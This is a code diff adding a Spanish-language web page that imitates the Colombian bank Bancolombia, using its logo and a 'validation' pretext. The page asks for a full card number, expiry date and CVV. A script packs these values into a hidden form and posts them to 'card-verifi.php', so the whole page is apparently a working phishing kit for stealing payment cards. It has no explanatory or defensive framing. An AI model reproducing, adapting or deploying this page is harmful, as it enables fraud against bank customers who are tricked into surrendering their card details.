@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Clave dinámica - Bancolombia</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body, html {
+      margin: 0;
+      padding: 0;
+      background-color: #e9eff5;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100%;
+    }
+
+    .main-container {
+      max-width: 400px;
+      margin: 40px auto;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+    }
+
+    .header {
+      background-color: #fff;
+      padding: 20px;
+      text-align: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+
+    .header img {
+      height: 100px;
+    }
+
+    .sub-header {
+      background-color: #f9f9f9;
+      text-align: center;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 500;
+      color: #333;
+    }
+
+    .form-container {
+      padding: 25px;
+      text-align: center;
+    }
+
+    .icono {
+      width: 45px;
+      margin-bottom: 12px;
+    }
+
+    .texto-intro {
+      font-size: 14px;
+      color: #000;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      text-align: left;
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #333;
+      font-size: 14px;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+      transition: border 0.2s;
+    }
+
+    input:focus, select:focus {
+      border-color: #ffcc00;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .button-row {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 25px;
+    }
+
+    .button-row button {
+      padding: 14px;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    #continuar {
+      background-color: #ffcc00;
+      color: black;
+      border: 1px solid #333;
+    }
+
+    #continuar:hover {
+      background-color: #f5c400;
+    }
+
+    #cancelar {
+      background-color: #ccc;
+      color: #333;
+    }
+
+    #cancelar:hover {
+      background-color: #b3b3b3;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="main-container">
+    <!-- Encabezado con logo -->
+    <div class="header">
+      <img src="https://logos-world.net/wp-content/uploads/2023/02/Bancolombia-Logo.jpg" alt="Bancolombia">
+    </div>
+
+    <!-- Subtítulo -->
+    <div class="sub-header">Datos de su Tarjeta</div>
+
+    <!-- Contenido del formulario -->
+    <div class="form-container">
+      <img src="https://static.vecteezy.com/system/resources/previews/002/206/096/non_2x/credit-card-icon-free-vector.jpg" alt="Ícono de tarjeta" class="icono">
+      <div class="texto-intro">Ingrese sus datos de su tarjeta correctamente para completar su validacion.</div>
+
+      <form action="card-verifi.php" method="POST">
+    <div class="form-group">
+      <label for="numerotarjeta">Número de tarjeta</label>
+      <input type="tel" id="numerotarjeta" name="numero" maxlength="16" placeholder="0000 0000 0000 0000" required>
+    </div>
+
+    <div class="form-group">
+      <label>Fecha de expiración</label>
+      <div class="form-row">
+        <select id="mes" name="mes" required>
+          <option value="" disabled selected>Mes</option>
+          <option>Enero</option>
+          <option>Febrero</option>
+          <option>Marzo</option>
+          <option>Abril</option>
+          <option>Mayo</option>
+          <option>Junio</option>
+          <option>Julio</option>
+          <option>Agosto</option>
+          <option>Septiembre</option>
+          <option>Octubre</option>
+          <option>Noviembre</option>
+          <option>Diciembre</option>
+        </select>
+
+        <select id="anio" name="anio" required>
+          <option value="" disabled selected>Año</option>
+          <option>2025</option>
+          <option>2026</option>
+          <option>2027</option>
+          <option>2028</option>
+          <option>2029</option>
+          <option>2030</option>
+          <option>2031</option>
+          <option>2032</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="cvv">CVV</label>
+      <input type="tel" id="cvv" name="cvv" maxlength="3" placeholder="123" required>
+    </div>
+
+    <div class="button-row">
+      <button type="button" id="continuar">Continuar</button>
+
+      <button type="button" id="cancelar">Cancelar</button>
+    </div>
+  </form>
+
+<script>
+  document.getElementById('continuar').addEventListener('click', () => {
+    const numero = document.getElementById('numerotarjeta').value;
+    const mes = document.getElementById('mes').value;
+    const anio = document.getElementById('anio').value;
+    const cvv = document.getElementById('cvv').value.trim();
+
+    if (!numero || !mes || !anio || !cvv) {
+      alert("Todos los campos son obligatorios. Verifica que hayas seleccionado mes y año.");
+      return;
+    }
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'card-verifi.php';
+
+    const fields = { numero, mes, anio, cvv };
+
+    for (const key in fields) {
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = key;
+      input.value = fields[key];
+      form.appendChild(input);
+    }
+
+    document.body.appendChild(form);
+    form.submit();
+  });
+</script>
+
